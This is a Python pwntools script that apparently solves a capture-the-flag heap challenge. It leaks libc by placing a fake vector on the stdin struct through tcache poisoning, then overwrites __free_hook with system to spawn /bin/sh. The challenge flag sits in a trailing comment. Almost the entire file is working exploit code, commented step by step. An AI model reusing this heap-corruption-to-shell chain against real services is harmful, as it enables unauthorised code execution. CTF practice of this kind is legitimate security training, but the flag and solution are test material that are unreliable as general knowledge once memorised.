from pwn import *
from sys import argv

libc_elf = ELF('./libc.so.6')

if 'gdb' in argv:
    p = gdb.debug('./patched', gdbscript='b *create_vecc+26\nc', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = remote('chal.duc.tf', 30007)

def create_vecc(index):
    p.sendlineafter('1: create vecc', '1')
    p.sendlineafter('Index?', str(index))
    p.recvuntil('Done!')
    return index

def show_vecc(index):
    p.sendlineafter('1: create vecc', '5')
    p.sendlineafter('Index?', str(index))
    p.recvline()
    p.recvuntil('> ')


def destroy_vecc(index):
    p.sendlineafter('1: create vecc', '2')
    p.sendlineafter('Index?', str(index))

def append(index, length, content):
    log.info(hex(len(content)))
    assert len(content) <= length, f'{len(content)} {length}'
    p.sendlineafter('1: create vecc', '3')
    p.sendlineafter('Index?', str(index))
    p.sendlineafter('Length?', str(length))
    p.sendline(content)

create_vecc(0)
append(0, 16, b'a'*8 + p32(0) + p32(0x102020))
destroy_vecc(0)

create_vecc(1)

# vec 2 will have 0x102020 capacity, because it takes the freed buffer chunk from vec 0
create_vecc(2)

# this means we can overflow the chunk after vec 2's buffer and take control of the tcache
# i'm putting 0x602030 in the bin, which contains a pointer to stdin struct.
append(2, 0x20, p64(0x602030) + p32(8) + b'a'*0x14)
create_vecc(3)

# vec3 is on 0x602030, on the stdin struct. We can leak libc.
show_vecc(3)
leak = u64(p.recv(8))
libc_elf.address = leak - 0x3eba00
# libc6_2.27-3ubuntu1_amd64 
log.info(f'Libc: {hex(libc_elf.address)}')

binsh = libc_elf.address +  0x1b3e9a
# extend vec3 and make 1 fake vector on 0x602038, pointing to __free_hook - 8.
# Add the fake vec to the list of vectors, index 1
append(3, 0x40, p64(libc_elf.sym['__free_hook'] - 8) + p32(0) + p32(0x10000) + p64(0x602038) + b'a'*0x28)

# Overwrite free_hook. This input string will be placed in a temporary buffer, so we send /bin/sh\x00 first,
# And when free is called on the temporary buffer it will be taken as parameter to system.
append(1, 0x20, b'/bin/sh\x00' + p64(libc_elf.sym['system']) + b'a'*0x10)

p.interactive() # DUCTF{h@v_2_z3r0_ur_all0ca710n5}
